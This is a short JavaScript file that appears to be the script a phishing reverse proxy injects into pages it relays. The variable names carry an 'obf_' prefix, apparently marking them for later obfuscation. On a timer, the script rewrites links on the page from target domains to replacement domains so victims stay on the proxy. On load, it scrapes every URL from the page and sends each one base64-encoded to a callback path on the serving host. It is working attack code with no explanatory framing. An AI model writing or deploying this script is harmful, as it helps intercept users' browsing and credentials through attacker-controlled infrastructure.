var obf_var_callback_log = []

function obf_func_callback(obf_var_data) {
	obf_var_req = new XMLHttpRequest()
	obf_var_req.open("GET", "http://" + location.host + "/obf_path_callback?" + obf_var_data, true)
	obf_var_req.send()
}

setInterval(function(){
	for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {
		obf_var_regexp = new RegExp(obf_var_target_hosts[obf_var_i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace(/^\*/, "^[a-z][a-z0-9\\-\\.]*"), "ig")
		document.querySelectorAll("a").forEach(function(obf_var_element) {
			if (obf_var_element.href.match(obf_var_regexp)) {
				obf_var_second_regexp = new RegExp(obf_var_target_hosts[obf_var_i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace(/^\*/, ""))
				obf_var_element.href = obf_var_element.href.replace(obf_var_second_regexp, obf_var_replacement_hosts[obf_var_i])
			}
		})
	}
}, 666)

self.addEventListener("load", function() {
	obf_var_urls = document.body.innerHTML.match(/http(s|)\:\/\/[a-z0-9\.\-]{4,61}\.[a-z]{2,3}(:[0-9]{1,5}|)([\/][a-z0-9\-\.\/\,\_\~\!\$\&\'\(\)\*\+\;\=\:\@]*|)/ig)
	for (var obf_var_i = 0; obf_var_i < obf_var_urls.length; obf_var_i++) {
		obf_var_host = obf_var_urls[obf_var_i].replace(/http(s|)\:\/\//, "").replace(/\/.*/, "")
		obf_var_callback_log.indexOf(obf_var_host) == -1 ? obf_func_callback(btoa(obf_var_urls[obf_var_i])) : ""
		obf_var_callback_log.push(obf_var_host)
	}
})
